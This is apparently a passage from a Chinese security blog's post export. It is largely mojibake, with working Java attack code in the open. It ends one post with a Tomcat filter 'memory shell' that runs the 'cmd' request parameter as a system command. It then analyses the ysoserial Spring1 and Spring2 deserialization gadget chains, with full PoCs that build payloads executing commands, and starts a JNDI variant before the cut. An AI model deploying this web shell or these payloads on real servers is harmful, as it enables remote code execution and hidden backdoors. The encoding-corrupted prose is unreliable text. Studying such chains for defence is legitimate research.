servletRequest.getServletContext(); return null; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException String cmd = request.getParameter(cmd); response.setContentType(text/html; charset=UTF-8); PrintWriter writer = response.getWriter(); if (cmd != null) try InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); //å°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥æ‰«æå™¨å¹¶è¯»å–æ‰€æœ‰è¾“å…¥ java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\\\\A); String result = scanner.hasNext()?scanner.next():; scanner.close(); writer.write(result); writer.flush(); writer.close(); catch (IOException e) e.printStackTrace(); catch (NullPointerException n) n.printStackTrace(); chain.doFilter(request, response); ç¤ºä¾‹è¿™é‡Œæˆ‘ä»¬ä»ä»¥ä¸Šæ–‡çš„æ¼æ´ç¯å¢ƒä¸ºä¾‹ï¼Œé¦–å…ˆæˆ‘ä»¬å°†Tomcat_Echo_inject_ThreadLocalç±»å‘é€è¿‡å»ï¼Œåˆå§‹åŒ–å±æ€§ã€‚ ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶ä¼šæŠ¥500ï¼Œè¿™æ˜¯ç”±äºCCé“¾æœ¬èº«çš„ç¼˜æ•…ã€‚å†ä¸€æ¬¡å‘åŒ…ï¼Œç»“æœå¦‚ä¸‹ï¼Œè¯´æ˜æ­¤æ—¶æˆ‘ä»¬èƒ½å¤Ÿä»ThreadLocalå¯¹è±¡ä¸­è·å–requestäº† æ¥ç€æˆ‘ä»¬å†æŠŠfilterå†…å­˜é©¬ä¼ è¿›å» ä»ä¼šæŠ¥500ï¼Œä¸è¿‡ä¸è¦ç´§ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„å†…å­˜é©¬å·²ç»æ³¨å…¥è¿›å»äº† ç»“è¯­å†…å­˜é©¬è¿˜æ˜¯æ¯”è¾ƒéš¾æ‡‚ï¼Œè¿˜æ˜¯å¾—å¤šå›æ¥å¤ä¹ å¤ä¹  å‚è€ƒJavaå®‰å…¨å­¦ä¹ â€”â€”å†…å­˜é©¬","categories":["javaå†…å­˜é©¬"]},{"title":"javaååºåˆ—åŒ–ä¹‹ysoä¸­çš„springé“¾å­åˆ†æ","path":"/2025/04/28/javaååºåˆ—åŒ–ä¹‹ysoä¸­çš„springé“¾å­åˆ†æ/","content":"é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼ŒåŸæ–‡ä½œè€…ï¼šSherlockï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://xz.aliyun.com/news/17923 å‰è¨€æœ€è¿‘å¼€å§‹å­¦ä¹ springé“¾å­ï¼Œçœ‹ç½‘ä¸Šåˆ†æspringé“¾å­çš„æ–‡ç« ä¸å¤šï¼Œè®²çš„ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œè¿˜éƒ½æ˜¯ysoä¸­çš„spring1çš„é“¾å­åˆ†æï¼Œç‰¹æ­¤å‡ºä¸€ç¯‡æ–‡ç« æ¥è¯¦ç»†åˆ†æspring1å’Œspring2é“¾å­ Spring1springç‰ˆæœ¬èŒƒå›´åœ¨3.0.0åˆ°4.1.4 ä¾èµ– dependencies dependency groupIdorg.springframework/groupId artifactIdspring-core/artifactId version4.1.4.RELEASE/version /dependency dependency groupIdorg.springframework/groupId artifactIdspring-beans/artifactId version4.1.4.RELEASE/version /dependency/dependencies é“¾å­åˆ†æé“¾å­å¦‚ä¸‹æ‰€ç¤ºï¼š /*\tGadget chain: ObjectInputStream.readObject() SerializableTypeWrapper.MethodInvokeTypeProvider.readObject() SerializableTypeWrapper.TypeProvider(Proxy).getType() AnnotationInvocationHandler.invoke() HashMap.get() ReflectionUtils.findMethod() SerializableTypeWrapper.TypeProvider(Proxy).getType() AnnotationInvocationHandler.invoke() HashMap.get() ReflectionUtils.invokeMethod() Method.invoke() Templates(Proxy).newTransformer() AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke() ObjectFactory(Proxy).getObject() AnnotationInvocationHandler.invoke() HashMap.get() Method.invoke() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() TemplatesImpl.TransletClassLoader.defineClass() Pwner*(Javassist-generated).static init Runtime.exec() */ è¯¥é“¾å­è¿ç”¨åˆ°äº†ä¸‰å±‚åŠ¨æ€ä»£ç†ï¼Œå› æ­¤è¦æ±‚æˆ‘ä»¬å¯¹åŠ¨æ€ä»£ç†çš„åŸç†å’Œåˆ©ç”¨è¦æœ‰ä¸€ä¸ªè¾ƒä¸ºæ¸…æ™°çš„è®¤è¯†ï¼Œå…³äºåŠ¨æ€ä»£ç†çš„ç›¸å…³çŸ¥è¯†å¯è¯¦è§ä¸€ç¯‡æ–‡ç« ï¼šhttps://cina666.github.io/2024/11/06/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/ å¥½äº†æ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹æ­£å¼åˆ†æ é¦–å…ˆæˆ‘ä»¬å…ˆçœ‹å…¥å£ï¼Œä¹Ÿå°±æ˜¯SerializableTypeWrapper.MethodInvokeTypeProvider.readObject() è¿™é‡Œä¸»è¦å°±æ˜¯é€šè¿‡åå°„å®Œæˆæ–¹æ³•è°ƒç”¨ï¼ŒæŒ‰ç…§æˆ‘ä»¬ä¹‹å‰æ‰€å­¦çš„è‚¯å®šå°±è¦æƒ³åˆ°è°ƒç”¨TemplatesImpl.newTransformer()æ¥å®ç°ä»»æ„ç±»åŠ è½½ä»è€Œå¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ å› æ­¤æˆ‘ä»¬æ­£å¸¸æ€è·¯ä¸‹æˆ‘éœ€è¦è®©this.provider.getType()è¿”å›TemplatesImplå¯¹è±¡ï¼Œthis.methodNameä¸ºnewTransformer()æ–¹æ³•ï¼ŒmehodNameå¯ç›´æ¥é€šè¿‡åå°„èµ‹å€¼ çœ‹çœ¼getType()æ–¹æ³• è¿”å›çš„æ˜¯this.resultï¼Œè€Œåœ¨æ„é€ å‡½æ•°é‡Œé¢resultæ˜¯transientï¼Œä¸å¯è¢«åºåˆ—åŒ–çš„ï¼Œç›¸å½“äºè¿™ä¸ªæ–¹æ³•å¯¹æˆ‘ä»¬æ¥è¯´æ˜¯æ— ç”¨çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦ç”¨ä¸ŠåŠ¨æ€ä»£ç†äº†ï¼Œå½“è°ƒç”¨getType()æ–¹æ³•çš„æ—¶å€™é€šè¿‡InvocationHandlerçš„å¤„ç†è®©å…¶è¿”å›çš„æ˜¯TemplatesImplå¯¹è±¡ï¼Œè€Œåœ¨å­¦ccé“¾çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬æœ‰æ¥è§¦åˆ°è¿™ä¹ˆä¸€ä¸ªç±»AnnotationInvocationHandlerï¼Œå®ƒçš„invokeæ–¹æ³•å¯ä»¥é€šè¿‡æ§åˆ¶memberValuesçš„å±æ€§æ¥è®©å…¶è¿”å›ç‰¹å®šçš„å¯¹è±¡ public Object invoke(Object proxy, Method method, Object[] args) String member = method.getName(); Class?[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(equals) paramTypes.length == 1 paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(Too many parameters for an annotation method); switch(member) case toString: return toStringImpl(); case hashCode: return hashCodeImpl(); case annotationType: return type; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() Array.getLength(result) != 0) result = cloneArray(result); return result; ç©¶å…¶åŸå› åœ¨äº memberValuesæ˜¯ä¸€ä¸ªMapString,Objectç±»å‹çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®é”®ä¸ºgetTypeï¼Œå€¼ä¸ºæˆ‘ä»¬çš„TemplatesImplå¯¹è±¡ä¾¿å¯ä»¥è¿”å›æˆ‘ä»¬æƒ³è¦çš„ï¼Œé“¾å­ä¸åº”è¯¥å°±è¿™ä¹ˆç»“æŸäº†å— å…¶å®ä¸ç„¶ï¼Œå›çœ‹getType()æ–¹æ³•ï¼Œå®ƒè¦æ±‚çš„æ˜¯è¦è¿”å›ä¸€ä¸ªTypeç±»å‹çš„æ•°æ®ï¼Œè€Œæˆ‘ä»¬è¿”å›TemplatesImplå¯¹è±¡çš„è¯ä¾¿ä¼šäº§ç”Ÿç±»å‹ä¸Šçš„å†²çªï¼Œå¼ºè½¬ä¸äº†å¯¼è‡´æŠ¥é”™ æ‰€ä»¥æˆ‘ä»¬é€šè¿‡getType()è¿˜è¦è¿”å›ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œå…¶å¿…é¡»å®ç°Typeå’ŒTemplatesæ¥å£ é‚£ä¹ˆè¦é€‰æ‹©å“ªä¸€ä¸ªInvocationHandlerï¼Œæ‰èƒ½å¤Ÿè®©æˆ‘ä»¬åœ¨è°ƒç”¨è¯¥åŠ¨æ€ä»£ç†å¯¹è±¡çš„newTransformeræ–¹æ³•çš„æ—¶å€™è°ƒç”¨åˆ°æˆ‘ä»¬TemplatesImplå¯¹è±¡çš„newTransfoemeræ–¹æ³•å‘¢ æ³¨æ„ä¸€ä¸‹ï¼Œä¸Šé¢è®²çš„è°ƒç”¨è¯¥åŠ¨æ€ä»£ç†å¯¹è±¡çš„newTransformeræ–¹æ³•æ˜¯åœ¨ReflectionUtils.invokeMethod()é‡Œè°ƒç”¨çš„ public static Object invokeMethod(Method method, Object target) return invokeMethod(method, target, new Object[0]);public static Object invokeMethod(Method method, Object target, Object... args) try return method.invoke(target, args); catch (Exception ex) handleReflectionException(ex); throw new IllegalStateException(Should never get here); ysoçš„ä½œè€…æ›¿æˆ‘ä»¬æ‰¾åˆ°äº†ç­”æ¡ˆï¼Œå³AutowireUtils.ObjectFactoryDelegatingInvocationHandler çœ‹ä¸‹å®ƒçš„invokeæ–¹æ³• é‡ç‚¹å…³æ³¨return method.invoke(this.objectFactory.getObject(), args);ï¼Œé€šè¿‡è¿™ä¸ªæˆ‘ä»¬å¯ä»¥çŸ¥é“åªè¦æˆ‘ä»¬æ§åˆ¶this.objectFactory.getObject()çš„è¿”å›å€¼ä¸ºæˆ‘ä»¬çš„TemplatesImplå¯¹è±¡ä¾¿å¯ä»¥äº† åˆæåˆ°äº†æ§åˆ¶ï¼Œé‚£ä¹ˆè‡ªç„¶è€Œç„¶åœ°å°±åˆæƒ³åˆ°äº†é€šè¿‡å‰é¢æåˆ°çš„åŠ¨æ€ä»£ç†ï¼Œä¹Ÿå°±æ˜¯è®©this.objectFactoryä¸ºä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œå…¶InvocationHandlerè‡ªç„¶å°±è¿˜æ˜¯AnnotationInvocationHandlerï¼Œä½†æ˜¯è¿™ä¸€æ¬¡çš„memberValuesçš„é”®å°±è¦æ¢æˆgetObjectï¼Œå€¼è¿˜æ˜¯æˆ‘ä»¬äº²çˆ±çš„TemplatesImplå¯¹è±¡ åœ¨è¿™é‡Œæˆ‘ä»¬ä¾¿å¯ä»¥å®ç°åå°„è°ƒç”¨TemplatesImplçš„newTransformeræ–¹æ³•ï¼Œä»è€Œå®ç°ä»»æ„ç±»åŠ è½½ è°ƒè¯•ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬çš„pocå¦‚ä¸‹ package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.springframework.beans.factory.ObjectFactory;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class Main public static void main(String[] args) throws Exception TemplatesImpl templates = new TemplatesImpl(); setField(templates, _name, aaa); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; setField(templates,_bytecodes, codes); setField(templates,_tfactory, new TransformerFactoryImpl()); HashMapObject, Object hashMap = new HashMap(); hashMap.put(getObject, templates); Class? c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor? constructor = c.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, hashMap); ObjectFactory? objectFactory = (ObjectFactory?) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]ObjectFactory.class, invocationHandler); Class? clazz = Class.forName(org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler); Constructor? constructor2 = clazz.getDeclaredConstructors()[0]; constructor2.setAccessible(true); InvocationHandler invocationHandler2 = (InvocationHandler) constructor2.newInstance(objectFactory); Type type = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]Type.class, Templates.class, invocationHandler2); HashMapObject, Object hashMap2 = new HashMap(); hashMap2.put(getType, type); InvocationHandler invocationHandler3 = (InvocationHandler) constructor.newInstance(Target.class, hashMap2); Class? typeProviderClass = Class.forName(org.springframework.core.SerializableTypeWrapper$TypeProvider); Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]typeProviderClass, invocationHandler3); Class? class2 = Class.forName(org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider); Constructor? constructor3 = class2.getDeclaredConstructors()[0]; constructor3.setAccessible(true); Object object = constructor3.newInstance(typeProviderProxy, Object.class.getMethod(toString), 0); setField(object, methodName, newTransformer); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(object); byte[] serializedBytes = byteArrayOutputStream.toByteArray(); String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes); System.out.println(base64Encoded); byte[] decodedBytes = Base64.getDecoder().decode(base64Encoded); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(decodedBytes)); objectInputStream.readObject(); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); å…¶ä¸­çš„Test.classæ–‡ä»¶çš„å…·ä½“å†…å®¹å¦‚ä¸‹ package org.example;import java.io.IOException;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Test extends AbstractTranslet @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException static try Runtime.getRuntime().exec(calc); catch (IOException e) throw new RuntimeException(e); é‚£okï¼Œæˆ‘ä»¬è¿›è¡Œè°ƒè¯• è·Ÿè¿›getTypeæ–¹æ³•ï¼ŒæŒ‰ç…§åŠ¨æ€ä»£ç†çš„åŸç†ï¼Œå°±ä¼šç›´æ¥è·³åˆ°InvocationHandlerä¸­çš„invokeæ–¹æ³•å¤„ï¼Œå¦‚ä¸‹ï¼š ä»merberValuesä¸­è¯»åˆ°äº†getTypeçš„å€¼ï¼Œä¹Ÿå°±æ˜¯åŒæ—¶å®ç°Typeå’ŒTemplatesæ¥å£çš„ä»£ç†å¯¹è±¡ï¼Œåè¿”å›result é€šè¿‡ReflectionUtils.findMethodæ–¹æ³•æˆåŠŸè·å–åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„newTransformeræ–¹æ³• å¾€ä¸‹èµ°ï¼Œè·Ÿè¿›invokeMethodæ–¹æ³•ï¼ˆè¯¥è¡Œä¸­çš„this.provider.getType()è¿”å›çš„ä¾ç„¶æ˜¯åŒæ—¶å®ç°Typeå’ŒTemplatesæ¥å£çš„ä»£ç†å¯¹è±¡ï¼‰ å†è·Ÿè¿›invokeæ–¹æ³• ä¾¿èµ°åˆ°äº†AutowireUtils.ObjectFactoryDelegatingInvocationHandler.invoke()æ–¹æ³•ä¸­ï¼Œmethodæ˜¯newTrnasFormeræ–¹æ³•æ‰€ä»¥éƒ½ä¸ä¼šèµ°è¿›ifé‡Œé¢ ç»§ç»­å¾€ä¸‹èµ° æ ¹æ®pocæˆ‘ä»¬å¯ä»¥çŸ¥é“è¯¥å¤„çš„this.objectFactoryæ˜¯ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œè°ƒç”¨getObject()æ–¹æ³•ä¾¿ä¼šèµ°åˆ°å…¶InvocationHandlerçš„invokeæ–¹æ³•ä¸­ è·Ÿè¿› æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿”å›çš„resultä¾¿æ˜¯æˆ‘ä»¬å¿ƒå¿ƒå¿µå¿µçš„TemplatesImplå¯¹è±¡ å¾€ä¸‹èµ°ï¼Œè¿”å›åï¼Œreturn method.invoke(this.objectFactory.getObject(), args);ä»£ç å…¶å®å°±æ˜¯return method.invoke(templates, args); æˆåŠŸè°ƒç”¨TemplatesImplçš„newTransformeræ–¹æ³•ï¼Œå®ç°ä»»æ„ç±»åŠ è½½ å¼¹å‡ºè®¡ç®—å™¨ Spring2ä¾èµ– dependencies dependency groupIdorg.springframework/groupId artifactIdspring-core/artifactId version4.1.4.RELEASE/version /dependency dependency groupIdorg.springframework/groupId artifactIdspring-beans/artifactId version4.1.4.RELEASE/version /dependency dependency groupIdorg.springframework/groupId artifactIdspring-aop/artifactId version4.1.4.RELEASE/version /dependency/dependencies é“¾å­åˆ†æé“¾å­å¦‚ä¸‹ï¼š /** * Gadget chain: * TemplatesImpl.newTransformer() * Method.invoke(Object, Object...) * AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[]) * JdkDynamicAopProxy.invoke(Object, Method, Object[]) * $Proxy0.newTransformer() * Method.invoke(Object, Object...) * SerializableTypeWrapper$MethodInvokeTypeProvider.readObject(ObjectInputStream) * * @author mbechler */ è¯¥æ¡é“¾å­ä¸Spring1çš„å‰åŠæ¡é“¾å­æ˜¯ä¸€æ ·çš„ï¼Œå…¥å£éƒ½æ˜¯SerializableTypeWrapper$MethodInvokeTypeProvider.readObject è¿™æ¡é“¾å­ä¸»è¦æ˜¯ä¸ºäº†è¯´æ˜ObjectFactoryDelegatingInvocationHandlerå¹¶ä¸æ˜¯å…³é”®æ‰€åœ¨ï¼Œå³ä½¿å®ƒè¢«ç¦äº†æˆ‘ä»¬ä¾ç„¶æœ‰å…¶ä»–çš„æ–¹æ³•å¯ä»¥æˆåŠŸå®ç°ä»»æ„ç±»åŠ è½½ è¿™é‡Œæ‰€ç”¨çš„å…³é”®InvocationHandleré™¤äº†AnnotationInvocationHandlerä¹‹å¤–å°±æ˜¯JdkDynamicAopProxy æˆ‘ä»¬è¿›è¯¥ç±»çš„invokeæ–¹æ³•çœ‹ä¸€æ‰‹ public Object invoke(Object proxy, Method method, Object[] args) throws Throwable MethodInvocation invocation; Object oldProxy = null; boolean setProxyContext = false; TargetSource targetSource = this.advised.targetSource; Class? targetClass = null; Object target = null; try if (!this.equalsDefined AopUtils.isEqualsMethod(method)) // The target does not implement the equals(Object) method itself. return equals(args[0]); if (!this.hashCodeDefined AopUtils.isHashCodeMethod(method)) // The target does not implement the hashCode() method itself. return hashCode(); if (!this.advised.opaque method.getDeclaringClass().isInterface() method.getDeclaringClass().isAssignableFrom(Advised.class)) // Service invocations on ProxyConfig with the proxy config... return AopUtils.invokeJoinpointUsingReflection(this.advised, method, args); Object retVal; if (this.advised.exposeProxy) // Make invocation available if necessary. oldProxy = AopContext.setCurrentProxy(proxy); setProxyContext = true; // May be null. Get as late as possible to minimize the time we own the target, // in case it comes from a pool. target = targetSource.getTarget(); if (target != null) targetClass = target.getClass(); // Get the interception chain for this method. ListObject chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); // Check whether we have any advice. If we dont, we can fallback on direct // reflective invocation of the target, and avoid creating a MethodInvocation. if (chain.isEmpty()) // We can skip creating a MethodInvocation: just invoke the target directly // Note that the final invoker must be an InvokerInterceptor so we know it does // nothing but a reflective operation on the target, and no hot swapping or fancy proxying. retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args); . . . . . return retVal; finally if (target != null !targetSource.isStatic()) // Must have come from TargetSource. targetSource.releaseTarget(target); if (setProxyContext) // Restore old proxy. AopContext.setCurrentProxy(oldProxy); ä»æä¾›çš„é“¾å­å¯çŸ¥é¦–å…ˆæˆ‘ä»¬è¦å…³æ³¨çš„æ˜¯retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args); è·Ÿè¿›invokeJoinpointUsingReflectionæ–¹æ³• é‡Œé¢å°±æ˜¯ç®€ç®€å•å•å¯¹æ–¹æ³•è¿›è¡Œäº†åå°„è°ƒç”¨ æ‰€ä»¥é‡ç‚¹çœ‹å‚æ•°targetï¼štarget = targetSource.getTarget(); å†çœ‹targetSourceï¼šTargetSource targetSource = this.advised.targetSource; å†è·Ÿè¿›targetSourceæˆ‘ä»¬å¯ä»¥å‘ç°æ˜¯åœ¨AdvisedSupportç±»é‡Œé¢è°ƒç”¨äº†setTargetæ–¹æ³•æ¥è¿›è¡Œèµ‹å€¼çš„ å› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨è°ƒç”¨setTargetçš„æ—¶å€™å°†å…¶å‚æ•°targetè®¾ä¸ºæˆ‘ä»¬çš„TemplatesImplå¯¹è±¡å°±å¯ä»¥äº†ï¼Œé‚£ä¹ˆæœ€ååœ¨invokeJoinpointUsingReflectionæ–¹æ³•é‡Œåå°„è°ƒç”¨çš„å°±æ˜¯æˆ‘ä»¬çš„TemplatesImplå¯¹è±¡çš„newTransformeræ–¹æ³•äº† è°ƒè¯•ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬çš„pocå¦‚ä¸‹ï¼š package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.springframework.aop.framework.AdvisedSupport;import org.springframework.aop.target.SingletonTargetSource;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class Poc public static void main(String[] args) throws Exception TemplatesImpl templates = new TemplatesImpl(); setField(templates, _name, aaa); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; setField(templates,_bytecodes, codes); setField(templates,_tfactory, new TransformerFactoryImpl()); // å°† AdvisedSupport çš„ target å±æ€§å€¼è®¾ç½®ä¸º templates // AdvisedSupport æ˜¯ Spring AOP çš„ä»£ç†é…ç½® managaer AdvisedSupport as = new AdvisedSupport(); as.setTargetSource(new SingletonTargetSource(templates)); // ä½¿ç”¨ JdkDynamicAopProxy(å®ç°äº†InvocationHandleræ¥å£) æ¥åˆ›å»º Type å’Œ Templates æ¥å£çš„åŠ¨æ€ä»£ç† // JdkDynamicAopProxy çš„ advised å±æ€§å€¼ä¸º as Class? c =Class.forName(org.springframework.aop.framework.JdkDynamicAopProxy); Constructor? constructor = c.getDeclaredConstructors()[0]; constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(as); Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]Type.class, Templates.class, invocationHandler); MapString, Object hashMap = new HashMap(); hashMap.put(getType, typeTemplatesProxy); Class? class2 = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor? constructor2 = class2.getDeclaredConstructor(Class.class, Map.class); constructor2.setAccessible(true); InvocationHandler invocationHandler2 = (InvocationHandler) constructor2.newInstance(Target.class, hashMap); Class? typeProviderClass = Class.forName(org.springframework.core.SerializableTypeWrapper$TypeProvider); Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]typeProviderClass, invocationHandler2); Class? class3 = Class.forName(org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider); Constructor? constructor3 = class3.getDeclaredConstructors()[0]; constructor3.setAccessible(true); Object object = constructor3.newInstance(typeProviderProxy, Object.class.getMethod(toString), 0); setField(object, methodName, newTransformer); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(object); byte[] serializedBytes = byteArrayOutputStream.toByteArray(); String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes); System.out.println(base64Encoded); byte[] decodedBytes = Base64.getDecoder().decode(base64Encoded); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(decodedBytes)); objectInputStream.readObject(); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); å‰é¢çš„è°ƒè¯•éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™è¾¹ç›´æ¥çœç•¥ï¼Œç›´æ¥è·³åˆ°è°ƒç”¨invokeMethodæ–¹æ³•ï¼Œè·Ÿè¿›å» æˆ‘ä»¬ä¾¿æ¥åˆ°äº†JdkDynamicAopProxyç±»çš„invokeæ–¹æ³•é‡Œ ç»§ç»­å¾€ä¸‹èµ° targetè·å–åˆ°äº†æˆ‘ä»¬çš„TemplatesImplå¯¹è±¡ ç»§ç»­å¾€ä¸‹èµ° è·Ÿè¿› æ–¹æ³•åå°„è°ƒç”¨ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ æ”»å‡»é¢æ‹“å±•å­¦ä¹ å®Œè¿™ä¸¤æ¡é“¾å­ä¹‹åæˆ‘å°±æ€è€ƒç€è¦æ˜¯TemplatesImplç±»è¢«ç¦æ‰äº†è¦æ€ä¹ˆåŠï¼Œåœ¨ç½‘ä¸Šæœå¯»äº†ä¸€ç•ªåå‘ç°æ²¡æœ‰ç°æˆçš„æ–‡ç« æ¥è®²è¿°ç›¸å…³çš„è§£å†³åŠæ³•ï¼Œæ‰€ä»¥æ‰“ç®—è‡ªå·±å°è¯•ä¸€æ‰‹ æˆ‘æƒ³çš„æ˜¯å°†è¯¥é“¾å­ä¸jndiæ³¨å…¥è”ç³»èµ·æ¥ï¼Œä»è€Œå®ç°è¿œç¨‹ç±»åŠ è½½ æ€è·¯æœ‰äº†é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾åˆ°åˆé€‚çš„å®ç°ç±»äº†ï¼Œæœ€å¼€å§‹æˆ‘æƒ³åˆ°çš„æ˜¯JDBcRowSetImplç±»ï¼Œåˆ©ç”¨å®ƒçš„getDatabaseMetaData()æ–¹æ³• ä½†æ˜¯å˜ç”±äºæˆ‘ä»¬é“¾å­å‰é¢éƒ½æ˜¯ç”¨åˆ°äº†ä»£ç†ï¼Œæ‰€ä»¥ä¹Ÿå°±è¯´æ˜æˆ‘ä»¬æ‰€æ‰¾çš„è¿™ä¸ªæ–¹æ³•å¿…é¡»æ˜¯ä½äºæ¥å£ä¸­çš„ï¼Œå¾ˆé—æ†¾è¯¥æ–¹æ³•å°±åªä½äºJDBcRowSetImplç±»é‡Œé¢ï¼Œæ‰€ä»¥ç”¨ä¸äº† æ¥ä¸‹æ¥åˆåˆ°å¤„æ‰¾å®ç°ç±»ï¼Œå…¨å±€æœç´¢lookupæ–¹æ³•ç­‰ç­‰ï¼Œéƒ½æ²¡æœ‰æ‰¾åˆ°æˆ‘æ‰€éœ€è¦çš„ ç›´åˆ°çªç„¶ä¹‹é—´æƒ³èµ·äº†ä¹‹å‰çœ‹è¿‡çš„ä¸€ç¯‡æ–‡ç« ï¼šhttp://blog.potatowo.top/2025/03/23/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2025%E5%8D%8E%E4%B8%9C%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9Bwp-web/ åœ¨è¿™ç¯‡æ–‡ç« é‡Œé¢æåˆ°äº†ä¸€ä¸ªç±»com.sun.jndi.ldap.LdapAttributeï¼Œå…¶æœ‰ä¸ªgetAttributeDefinition()æ–¹æ³•ï¼Œå…¶ä¸­è°ƒç”¨äº†lookup() è¯¥ç±»ç»§æ‰¿äº†BasicAttributeç±»ï¼Œè·Ÿè¿‡å» BasicAttributeç±»å®ç°äº†Attributeæ¥å£ï¼Œåœ¨è¿™ä¸ªæ¥å£ä¸­å®šä¹‰äº†getAttributeDefinition()æ–¹æ³• å¾ˆå¥½ï¼Œä¸€åˆ‡éƒ½å¯¹ä¸Šäº†ï¼Œè¿™å°±æ˜¯æˆ‘æ‰¾äº†è®¸ä¹…çš„ç±» é‡æ–°æ”¹ä¸€ä¸‹æˆ‘ä»¬çš„pocï¼Œå¦‚ä¸‹ package org.example;import org.springframework.beans.factory.ObjectFactory;import sun.reflect.ReflectionFactory;import javax.naming.CompositeName;import javax.naming.directory.Attribute;import java.io.ByteArrayInputStream;import 